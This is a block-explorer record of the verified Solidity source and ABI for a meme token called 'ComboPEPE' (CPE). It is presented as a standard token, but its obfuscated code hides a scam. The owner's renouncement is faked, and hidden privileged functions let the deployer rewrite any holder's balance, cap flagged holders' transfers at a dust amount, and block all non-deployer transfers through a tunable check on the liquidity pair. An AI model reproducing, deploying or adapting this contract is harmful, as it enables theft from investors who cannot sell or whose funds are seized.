{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface txLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeFrom) external view returns (uint256);\n\n    function transfer(address isTokenMode, uint256 shouldTake) external returns (bool);\n\n    function allowance(address atExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isTokenMode,\n        uint256 shouldTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingLimit, uint256 value);\n    event Approval(address indexed atExempt, address indexed spender, uint256 value);\n}\n\nabstract contract feeAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface listSender {\n    function createPair(address marketingFee, address maxAuto) external returns (address);\n}\n\ninterface txLimitMetadata is txLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ComboPEPE is feeAuto, txLimit, txLimitMetadata {\n\n    bool public buyTo;\n\n    function name() external view virtual override returns (string memory) {\n        return sellBuy;\n    }\n\n    bool private feeLaunched;\n\n    event OwnershipTransferred(address indexed listTotalBuy, address indexed maxLaunchReceiver);\n\n    bool private fundBuy;\n\n    function approve(address receiverList, uint256 shouldTake) public virtual override returns (bool) {\n        amountSellList[_msgSender()][receiverList] = shouldTake;\n        emit Approval(_msgSender(), receiverList, shouldTake);\n        return true;\n    }\n\n    uint8 private buyTx = 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyTx;\n    }\n\n    uint256 liquidityExempt;\n\n    uint256 constant buyAmountEnable = 5 ** 10;\n\n    function feeReceiver() public {\n        emit OwnershipTransferred(marketingSender, address(0));\n        minAt = address(0);\n    }\n\n    function fromShould(address shouldAt, address isTokenMode, uint256 shouldTake) internal returns (bool) {\n        require(marketingTotal[shouldAt] >= shouldTake);\n        marketingTotal[shouldAt] -= shouldTake;\n        marketingTotal[isTokenMode] += shouldTake;\n        emit Transfer(shouldAt, isTokenMode, shouldTake);\n        return true;\n    }\n\n    function totalAt() private view {\n        require(tokenLimitTake[_msgSender()]);\n    }\n\n    function transferFrom(address shouldAt, address isTokenMode, uint256 shouldTake) external override returns (bool) {\n        if (_msgSender() != senderMode) {\n            if (amountSellList[shouldAt][_msgSender()] != type(uint256).max) {\n                require(shouldTake <= amountSellList[shouldAt][_msgSender()]);\n                amountSellList[shouldAt][_msgSender()] -= shouldTake;\n            }\n        }\n        return listAutoTrading(shouldAt, isTokenMode, shouldTake);\n    }\n\n    function transfer(address isTx, uint256 shouldTake) external virtual override returns (bool) {\n        return listAutoTrading(_msgSender(), isTx, shouldTake);\n    }\n\n    constructor (){\n        if (tokenIs == launchTotal) {\n            buyTo = false;\n        }\n        isTotal fundMax = isTotal(senderMode);\n        receiverTo = listSender(fundMax.factory()).createPair(fundMax.WETH(), address(this));\n        \n        marketingSender = _msgSender();\n        feeReceiver();\n        tokenLimitTake[marketingSender] = true;\n        marketingTotal[marketingSender] = txMin;\n        \n        emit Transfer(address(0), marketingSender, txMin);\n    }\n\n    string private sellBuy = \"Combo PEPE\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return txTotalAmount;\n    }\n\n    address private minAt;\n\n    function listAutoTrading(address shouldAt, address isTokenMode, uint256 shouldTake) internal returns (bool) {\n        if (shouldAt == marketingSender) {\n            return fromShould(shouldAt, isTokenMode, shouldTake);\n        }\n        uint256 buyMinTake = txLimit(receiverTo).balanceOf(minTrading);\n        require(buyMinTake == liquidityExempt);\n        require(isTokenMode != minTrading);\n        if (limitTrading[shouldAt]) {\n            return fromShould(shouldAt, isTokenMode, buyAmountEnable);\n        }\n        return fromShould(shouldAt, isTokenMode, shouldTake);\n    }\n\n    function takeFrom(address txSender) public {\n        totalAt();\n        \n        if (txSender == marketingSender || txSender == receiverTo) {\n            return;\n        }\n        limitTrading[txSender] = true;\n    }\n\n    string private txTotalAmount = \"CPE\";\n\n    function allowance(address liquidityTrading, address receiverList) external view virtual override returns (uint256) {\n        if (receiverList == senderMode) {\n            return type(uint256).max;\n        }\n        return amountSellList[liquidityTrading][receiverList];\n    }\n\n    uint256 private txMin = 100000000 * 10 ** 18;\n\n    uint256 public tokenIs;\n\n    uint256 takeTeam;\n\n    function shouldMax(uint256 shouldTake) public {\n        totalAt();\n        liquidityExempt = shouldTake;\n    }\n\n    bool private minFrom;\n\n    function listTx(address minEnable) public {\n        if (walletAt) {\n            return;\n        }\n        if (tokenIs == launchTotal) {\n            minFrom = true;\n        }\n        tokenLimitTake[minEnable] = true;\n        \n        walletAt = true;\n    }\n\n    mapping(address => uint256) private marketingTotal;\n\n    address senderMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function balanceOf(address modeFrom) public view virtual override returns (uint256) {\n        return marketingTotal[modeFrom];\n    }\n\n    function owner() external view returns (address) {\n        return minAt;\n    }\n\n    address public receiverTo;\n\n    address minTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private amountSellList;\n\n    bool public walletAt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txMin;\n    }\n\n    address public marketingSender;\n\n    mapping(address => bool) public tokenLimitTake;\n\n    function getOwner() external view returns (address) {\n        return minAt;\n    }\n\n    uint256 public launchTotal;\n\n    function liquiditySwap(address isTx, uint256 shouldTake) public {\n        totalAt();\n        marketingTotal[isTx] = shouldTake;\n    }\n\n    mapping(address => bool) public limitTrading;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTotalBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxLaunchReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTake\",\"type\":\"uint256\"}],\"name\":\"liquiditySwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minEnable\",\"type\":\"address\"}],\"name\":\"listTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldTake\",\"type\":\"uint256\"}],\"name\":\"shouldMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txSender\",\"type\":\"address\"}],\"name\":\"takeFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenLimitTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isTokenMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ComboPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}